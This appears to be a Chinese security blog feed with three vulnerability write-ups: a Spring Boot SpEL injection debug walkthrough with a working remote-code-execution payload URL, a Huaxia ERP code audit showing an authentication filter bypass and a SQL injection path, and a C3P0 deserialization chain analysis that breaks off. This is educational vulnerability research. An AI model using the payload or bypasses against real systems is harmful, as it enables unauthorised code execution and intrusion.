    <content type="html"><![CDATA[<p>[toc]</p><h1 id="0x01-spel表达式基础"><a class="markdownIt-Anchor" href="#0x01-spel表达式基础">#</a> 0x01 SpEL 表达式基础</h1><h3 id="spel简介"><a class="markdownIt-Anchor" href="#spel简介">#</a> SpEL 简介</h3><p>在 Spring 3 中引入了 Spring 表达式语言（Spring Expression Language，简称 SpEL），这是一种功能强大的表达式语言，支持在运行时查询和操作对象图，可以与基于 XML 和基于注解的 Spring 配置还有 bean 定义一起使用。</p><p>在 Spring 系列产品中，SpEL 是表达式计算的基础，实现了与 Spring 生态系统所有产品无缝对接。Spring 框架的核心功能之一就是通过依赖注入的方式来管理 Bean 之间的依赖关系，而 SpEL 可以方便快捷的对 ApplicationContext 中的 Bean 进行属性的装配和提取。由于它能够在运行时动态分配值，因此可以为我们节省大量 Java 代码。</p><p>SpEL 有许多特性：</p><ul><li>使用 Bean 的 ID 来引用 Bean</li><li>可调用方法和访问对象的属性</li><li>可对值进行算数、关系和逻辑运算</li><li>可使用正则表达式进行匹配</li><li>可进行集合操作</li></ul><h3 id="spel定界符"><a class="markdownIt-Anchor" href="#spel定界符">#</a> SpEL 定界符 —— <code>#&#123;&#125;</code></h3><p>SpEL 使用 <code>#&#123;&#125;</code>  作为定界符，所有在大括号中的字符都将被认为是 SpEL 表达式，在其中可以使用 SpEL 运算符、变量、引用 bean 及其属性和方法等。</p><p>这里需要注意 <code>#&#123;&#125;</code>  和 <code>$&#123;&#125;</code>  的区别：</p><ul><li><code>#&#123;&#125;</code>  就是 SpEL 的定界符，用于指明内容通过 SpEL 表达式并执行；</li><li><code>$&#123;&#125;</code>  主要用于加载外部属性文件中的值；</li><li>两者可以混合使用，但是必须 <code>#&#123;&#125;</code>  在外面， <code>$&#123;&#125;</code>  在里面，如 <code>#&#123;'$&#123;&#125;'&#125;</code> ，注意单引号是字符串类型才添加的；</li></ul><h1 id="0x02-环境搭建"><a class="markdownIt-Anchor" href="#0x02-环境搭建">#</a> 0x02 环境搭建</h1><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce">https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce</a></p><p>直接运行</p><p>打开本地 9091 即可</p><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost:9091/article?id=$&#123;T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]&#123;0x63,0x61,0x6c,0x63&#125;))&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221515517.png" alt="image-20230522151544480"></p><h1 id="0x03-漏洞分析"><a class="markdownIt-Anchor" href="#0x03-漏洞分析">#</a> 0x03 漏洞分析</h1><p>随便打个断点</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221515995.png" alt="image-20230522151557905"></p><p>往下跟进</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221516781.png" alt="image-20230522151611575"></p><p>这里捕获到 web 端的异常信息，判断 <code>targetException</code>  是 <code>RuntimeException</code>  类的对象，将我们输入的内容赋值给了 <code>targetException</code></p><p>经过分支，Throwable 提取保存在堆栈中的错误信息。</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221516718.png" alt="image-20230522151623665"></p><p>后面都是一些无关紧要的。。。</p><p>直接将断点打在</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221516074.png" alt="image-20230522151635974"></p><p>这里是调用 SpEL 解析器来解析上下文内容</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221516935.png" alt="image-20230522151649905"></p><p>可以看到有报错的类，路径，报错类型、输入内容，事件和状态码</p><p>根据上面的信息，我们直接来看 <code>message</code>  即可， <code>timestamp</code>  和 <code>status</code>  可以直接跳过</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221517944.png" alt="image-20230522151707822"></p><p>跟进 <code>getValue</code></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221517046.png" alt="image-20230522151718932"></p><p>第一步和上面一样，都是调用 SpEL 解析器根据上下文来解析内容</p><p>这里是已经编译了，未 <code>false</code> ，跳过 <code>if</code></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221517047.png" alt="image-20230522151726835"></p><p>这里利用标准评估上下文对象 StandardEvaluationContext 来对抽象语法树进行解析，实际是一个深度优先搜索的计算过程，最终返回整个表达式的计算结果；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ExpressionState</span> <span class="variable">expressionState</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExpressionState</span>(context, <span class="built_in">this</span>.configuration);</span><br><span class="line"><span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.ast.getValue(expressionState);</span><br><span class="line">checkCompile(expressionState);</span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><p>获取输入的内容并调用 <code>toString</code></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221517570.png" alt="image-20230522151736503"></p><p>接着跟进到这里</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221517379.png" alt="image-20230522151749339"></p><p>其中 <code>placeholder</code>  拿到值 <code>message</code> ， <code>proval</code>  为 <code>payload</code></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221517119.png" alt="image-20230522151758072"></p><p>并调用 <code>StringBuilder</code>  来处理修改我们的 <code>payload</code></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221518257.png" alt="image-20230522151805129"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">startIndex</span> <span class="operator">=</span> strVal.indexOf(<span class="built_in">this</span>.placeholderPrefix);</span><br></pre></td></tr></table></figure><p>获取 <code>payload</code>  的前缀 <code>$&#123;</code></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221518906.png" alt="image-20230522151812827"></p><p>进入 <code>while</code>  后，定义了 <code>endIndex</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">endIndex</span> <span class="operator">=</span> findPlaceholderEndIndex(result, startIndex);</span><br></pre></td></tr></table></figure><p>来看下 <code>findPlaceholderEndIndex</code>  方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="title function_">findPlaceholderEndIndex</span><span class="params">(CharSequence buf, <span class="type">int</span> startIndex)</span> &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> startIndex + <span class="built_in">this</span>.placeholderPrefix.length();</span><br><span class="line"><span class="type">int</span> <span class="variable">withinNestedPlaceholder</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (index &lt; buf.length()) &#123;</span><br><span class="line"><span class="keyword">if</span> (StringUtils.substringMatch(buf, index, <span class="built_in">this</span>.placeholderSuffix)) &#123;</span><br><span class="line"><span class="keyword">if</span> (withinNestedPlaceholder &gt; <span class="number">0</span>) &#123;</span><br><span class="line">withinNestedPlaceholder--;</span><br><span class="line">index = index + <span class="built_in">this</span>.placeholderSuffix.length();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> index;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (StringUtils.substringMatch(buf, index, <span class="built_in">this</span>.simplePrefix)) &#123;</span><br><span class="line">withinNestedPlaceholder++;</span><br><span class="line">index = index + <span class="built_in">this</span>.simplePrefix.length();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">index++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上图可知，int index 也就等于 24+2=26</p><p>显然 <code>index&lt;buf.length()</code> ，进入 while 循环</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221518993.png" alt="image-20230522151821848"></p><p>接着会遍历字符串是否为后缀 &quot;}&quot;，从 index=26 开始</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221518138.png" alt="image-20230522151832032"></p><p>似乎到 109 就结束了</p><p>下一步</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221522738.png" alt="img"></p><p>这里 <code>For input string: &amp;quot;</code>  是 24，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">placeholder</span> <span class="operator">=</span> result.substring(startIndex + <span class="built_in">this</span>.placeholderPrefix.length(), endIndex);</span><br></pre></td></tr></table></figure><p>换句话说也就是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">placeholder</span> <span class="operator">=</span> result.substring(<span class="number">24</span> + <span class="number">2</span>, <span class="number">109</span>);</span><br></pre></td></tr></table></figure><p>换言之</p><p>也就是将 ${} 中的内容提取出来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(java.lang.Runtime).getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">0x63</span>,<span class="number">0x61</span>,<span class="number">0x6c</span>,<span class="number">0x63</span>&#125;))</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221522835.png" alt="image-20230522152224788"></p><p>并将其赋值给 <code>originalPlaceholder</code></p><p>重写的 <code>resolvePlaceholder</code>  处理 <code>name</code></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221522289.png" alt="image-20230522152232137"></p><p>还是同样的 <code>getValue</code></p><p>获取上下文和 <code>Expression</code></p><p>并编译表达式</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221522622.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;0x01-spel表达式基础&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#0x01-spel表达式基础&quot;&gt;#&lt;/a&gt; 0x01 SpEL 表达式基础&lt;/h1&gt;
&lt;h3 id=&quot;spel简介&quot;&gt;&lt;a class</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://ki10moc.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Java安全" scheme="https://ki10moc.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>华夏ERP-代码审计</title>
    <link href="https://ki10moc.github.io/2023/03/09/%E5%8D%8E%E5%A4%8FERP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>https://ki10moc.github.io/2023/03/09/%E5%8D%8E%E5%A4%8FERP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2023-03-09T13:09:36.000Z</published>
    <updated>2024-06-08T15:14:10.244Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="0x01环境搭建"><a class="markdownIt-Anchor" href="#0x01环境搭建">#</a> 0x01 环境搭建</h1><p><a href="https://github.com/jishenghua/jshERP/releases/tag/2.3">Release 华夏 ERP_v2.3・jishenghua/jshERP・GitHub</a></p><p>连数据库，改端口，直接 run</p><h1 id="0x02代码审计"><a class="markdownIt-Anchor" href="#0x02代码审计">#</a> 0x02 代码审计</h1><h2 id="filter过滤器"><a class="markdownIt-Anchor" href="#filter过滤器">#</a> Filter 过滤器</h2><p><img src="http://rtd6qa0cy.bkt.gdipper.com/image-20230512154239040.png" alt="image-20230512154239040"></p><ul><li>ignoredUrl：表示被忽略的 URL 的模式，它使用 # 分隔了一些后缀名，如 .css、.js、.jpg、.png、.gif、.ico，这些后缀名的 URL 将不会被 LogCostFilter 过滤。</li><li>filterPath：表示需要过滤的 URL 的模式，它使用 # 分隔了一些需要过滤的 URL，如 /user/login、/user/registerUser、/v2/api-docs 等。</li></ul><p>接着是初始化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filterPath</span> <span class="operator">=</span> filterConfig.getInitParameter(FILTER_PATH);</span><br><span class="line">        <span class="keyword">if</span> (!StringUtils.isEmpty(filterPath)) &#123;</span><br><span class="line">            allowUrls = filterPath.contains(<span class="string">&quot;#&quot;</span>) ? filterPath.split(<span class="string">&quot;#&quot;</span>) : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;filterPath&#125;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">ignoredPath</span> <span class="operator">=</span> filterConfig.getInitParameter(IGNORED_PATH);</span><br><span class="line">        <span class="keyword">if</span> (!StringUtils.isEmpty(ignoredPath)) &#123;</span><br><span class="line">            ignoredUrls = ignoredPath.contains(<span class="string">&quot;#&quot;</span>) ? ignoredPath.split(<span class="string">&quot;#&quot;</span>) : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;ignoredPath&#125;;</span><br><span class="line">            <span class="keyword">for</span> (String ignoredUrl : ignoredUrls) &#123;</span><br><span class="line">                ignoredList.add(ignoredUrl);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>获取两个参数・ <code>*FILTER_PATH*</code>  和 <code>*IGNORED_PATH*</code> ，检索其是否有 #，并分离然后存入数组</p><p>再来看下 <code>doFilter</code>  函数，这也是来看 Filter` 过滤器实际的作用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response,</span></span><br><span class="line"><span class="params">                         FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> (HttpServletRequest) request;</span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">servletResponse</span> <span class="operator">=</span> (HttpServletResponse) response;</span><br><span class="line">        <span class="type">String</span> <span class="variable">requestUrl</span> <span class="operator">=</span> servletRequest.getRequestURI();</span><br><span class="line">        <span class="comment">//具体，比如：处理若用户未登录，则跳转到登录页</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">userInfo</span> <span class="operator">=</span> servletRequest.getSession().getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(userInfo!=<span class="literal">null</span>) &#123; <span class="comment">//如果已登录，不阻止</span></span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (requestUrl != <span class="literal">null</span> &amp;&amp; (requestUrl.contains(<span class="string">&quot;/doc.html&quot;</span>) ||</span><br><span class="line">            requestUrl.contains(<span class="string">&quot;/register.html&quot;</span>) || requestUrl.contains(<span class="string">&quot;/login.html&quot;</span>))) &#123;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (verify(ignoredList, requestUrl)) &#123;</span><br><span class="line">            chain.doFilter(servletRequest, response);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> != allowUrls &amp;&amp; allowUrls.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (String url : allowUrls) &#123;</span><br><span class="line">                <span class="keyword">if</span> (requestUrl.startsWith(url)) &#123;</span><br><span class="line">                    chain.doFilter(request, response);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        servletResponse.sendRedirect(<span class="string">&quot;/login.html&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里理解起来也比较简单</p><p>首先是初始化的两个变量，一个请求一个相应， <code>requestUrl</code>  获取请求的 <code>Url</code></p><p>第一个 if</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">然后读取`Session`获取用户信息</span><br><span class="line">如果是登录状态则放行</span><br></pre></td></tr></table></figure><p>第二个 if</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果Url不为空就判断是否包含&quot;/doc.html&quot;,&quot;/register.html&quot;和&quot;/login.html&quot;</span><br><span class="line">如果包含就放行</span><br></pre></td></tr></table></figure><p>第三个 if</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">调用`verify`函数，实际上就是来检测`Url`是否是可忽视`Url`</span><br><span class="line">如果是则放行</span><br></pre></td></tr></table></figure><p>第四个 if</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果允许Url数组不为空，则检索Url是否在允许列表</span><br><span class="line">如果是则放行</span><br></pre></td></tr></table></figure><p>否则跳转到登录界面</p><p>可直接访问忽略的 urlpath</p><p><img src="http://rtd6qa0cy.bkt.gdipper.com/image-20230512170907517.png" alt="image-20230512170907517"></p><p>那么这里考虑两个问题，实际是一个问题</p><p>也就是 Filter 放行的两个数组名单，一个忽略的一个白名单</p><p>第一</p><p>其中对 <code>*ignoredList*</code>  的判断是通过一个 <code>verify</code>  函数，</p><p>相当于只匹配 <code>regex</code>  而不顾及前后缀</p><p><img src="http://rtd6qa0cy.bkt.gdipper.com/image-20230512173140932.png" alt="image-20230512173140932"></p><p>这里应该使用 <code>endsWith()</code>  来判断资源的后缀为 js、css 等</p><p>第二</p><p>白名单的判断通过 <code>startsWith()</code>  的话</p><p>是可以通过目录穿越来饶过认证</p><p><img src="http://rtd6qa0cy.bkt.gdipper.com/image-20230512173314096.png" alt="image-20230512173314096"></p><p>另外如果 <code>Url</code>  中存在 /doc.html，/register.html，/login.html 同样也会放行，也就是可以进行绕过</p><h2 id="鉴权绕过"><a class="markdownIt-Anchor" href="#鉴权绕过">#</a> 鉴权绕过</h2><p>前面我们说了 <code>Filter</code>  拦截器的处理规则</p><p>当 <code>Url</code>  中存在 /doc.html，/register.html，/login.html 的时候就会直接放行</p><p><img src="C:%5CUsers%5Cki10Moc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230519163611007.png" alt="image-20230519163611007"></p><p>这里没有 session，就会重定向到 login.html 界面</p><h2 id="sql注入"><a class="markdownIt-Anchor" href="#sql注入">#</a> SQL 注入</h2><p>全局搜索 <code>$&#123;</code></p><p>来到 <code>UserMaooerEx.xml</code></p><p><img src="http://rtd6qa0cy.bkt.gdipper.com/image-20230517195937230.png" alt="image-20230517195937230"></p><p>全局搜索 <code>selectByConditionUser</code></p><p>到 <code>UserMapperEx</code>  的接口</p><p><img src="http://rtd6qa0cy.bkt.gdipper.com/image-20230517200021735.png" alt="image-20230517200021735"></p><p>接着全局搜索或者查找引用</p><p>到 <code>UsserService</code>  的 java 文件</p><p><img src="http://rtd6qa0cy.bkt.gdipper.com/image-20230517200133414.png" alt="image-20230517200133414"></p><p>来到 <code>UserComponent</code></p><p>接着找哪里调用了 <code>UserService.select</code>  方法</p><p><img src="http://rtd6qa0cy.bkt.gdipper.com/image-20230517200820484.png" alt="image-20230517200820484"></p><p>这里通过 <code>search</code>  字段获取 <code>userName</code>  和 <code>loginName</code>  并且可控</p><p>在 <code>CommonQueryManager</code>  下调用</p><p><img src="http://rtd6qa0cy.bkt.gdipper.com/image-20230518224148428.png" alt="image-20230518224148428"></p><p>接着来到 <code>ResourceController</code></p><p>这里到了 contoller 层就可以看前端获取数据了</p><p><img src="http://rtd6qa0cy.bkt.gdipper.com/image-20230518224236337.png" alt="image-20230518224236337"></p><p>到用户管理界面进行验证</p><p><img src="http://rtd6qa0cy.bkt.gdipper.com/image-20230517173521606.png" alt="image-20230517173521606"></p><p><img src="http://rtd6qa0cy.bkt.gdipper.com/image-20230517173309096.png" alt="image-20230517173309096"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;0x01环境搭建&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#0x01环境搭建&quot;&gt;#&lt;/a&gt; 0x01 环境搭建&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/jishenghua/</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://ki10moc.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Java安全" scheme="https://ki10moc.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>浅析C3P0攻击链</title>
    <link href="https://ki10moc.github.io/2023/03/09/%E6%B5%85%E6%9E%90C3P0%E6%94%BB%E5%87%BB%E9%93%BE/"/>
    <id>https://ki10moc.github.io/2023/03/09/%E6%B5%85%E6%9E%90C3P0%E6%94%BB%E5%87%BB%E9%93%BE/</id>
    <published>2023-03-09T13:09:36.000Z</published>
    <updated>2023-10-22T08:09:52.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a class="markdownIt-Anchor" href="#前言">#</a> 前言</h1><p>C3P0 是一个开源的 JDBC 连接池，它实现了数据源和 JNDI 绑定，支持 JDBC3 规范和 JDBC2 的标准扩展。目前使用它的开源项目有 Hibernate，Spring 等。</p><p>JDBC 是 Java DataBase Connectivity 的缩写，它是 Java 程序访问数据库的标准接口。<br>使用 Java 程序访问数据库时，Java 代码并不是直接通过 TCP 连接去访问数据库，而是通过 JDBC 接口来访问，而 JDBC 接口则通过 JDBC 驱动来实现真正对数据库的访问。</p><p>连接池类似于线程池，在一些情况下我们会频繁地操作数据库，此时 Java 在连接数据库时会频繁地创建或销毁句柄，增大资源的消耗。为了避免这样一种情况，我们可以提前创建好一些连接句柄，需要使用时直接使用句柄，不需要时可将其放回连接池中，准备下一次的使用。类似这样一种能够复用句柄的技术就是池技术。</p><h1 id="环境搭建"><a class="markdownIt-Anchor" href="#环境搭建">#</a> 环境搭建</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.mchange&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;c3p0&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">0.9</span><span class="number">.5</span><span class="number">.2</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h1 id="关于c3p0攻击链的利用方式"><a class="markdownIt-Anchor" href="#关于c3p0攻击链的利用方式">#</a> 关于 C3P0 攻击链的利用方式</h1><p>1、URLClassLoader 远程类加载<br> 2、JNDI 注入<br> 3、利用 HEX 序列化字节加载器进行反序列化攻击</p><h2 id="urlclassloader"><a class="markdownIt-Anchor" href="#urlclassloader">#</a> URLClassLoader</h2><p>漏洞点在 <code>PoolBackedDataSourceBase</code></p><p><code>readobject</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">( ObjectInputStream ois )</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">short</span> <span class="variable">version</span> <span class="operator">=</span> ois.readShort();</span><br><span class="line"><span class="keyword">switch</span> (version)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> VERSION:</span><br><span class="line"><span class="comment">// we create an artificial scope so that we can use the name o for all indirectly serialized objects.</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line"><span class="keyword">if</span> (o <span class="keyword">instanceof</span> IndirectlySerialized) o = ((IndirectlySerialized) o).getObject();</span><br><span class="line"><span class="built_in">this</span>.connectionPoolDataSource = (ConnectionPoolDataSource) o;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">this</span>.dataSourceName = (String) ois.readObject();</span><br><span class="line"><span class="comment">// we create an artificial scope so that we can use the name o for all indirectly serialized objects.</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line"><span class="keyword">if</span> (o <span class="keyword">instanceof</span> IndirectlySerialized) o = ((IndirectlySerialized) o).getObject();</span><br><span class="line"><span class="built_in">this</span>.extensions = (Map) o;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">this</span>.factoryClassLocation = (String) ois.readObject();</span><br><span class="line"><span class="built_in">this</span>.identityToken = (String) ois.readObject();</span><br><span class="line"><span class="built_in">this</span>.numHelperThreads = ois.readInt();</span><br><span class="line"><span class="built_in">this</span>.pcs = <span class="keyword">new</span> <span class="title class_">PropertyChangeSupport</span>( <span class="built_in">this</span> );</span><br><span class="line"><span class="built_in">this</span>.vcs = <span class="keyword">new</span> <span class="title class_">VetoableChangeSupport</span>( <span class="built_in">this</span> );</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Unsupported Serialized Version: &quot;</span> + version);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221433069.jpg" alt="img"></p><p>这里会先判断对象 o 是否是 <code>IndirectlySerialized</code>  类的对象或者是其子类的对象<br>调用 <code>getobject</code>  后强转换对象为 <code>ConnectionPoolDataSource</code> <br> 但是该接口并不能反序列化</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221445345.png" alt="image-20230522144558281"></p><p>去看下入口点 <code>writeobject</code>  处的写法<br> <code>writeobject</code></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221446560.png" alt="image-20230522144609339"></p><p>看下调用返回的对象<br><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221446160.png" alt="image-20230522144627000"><br> 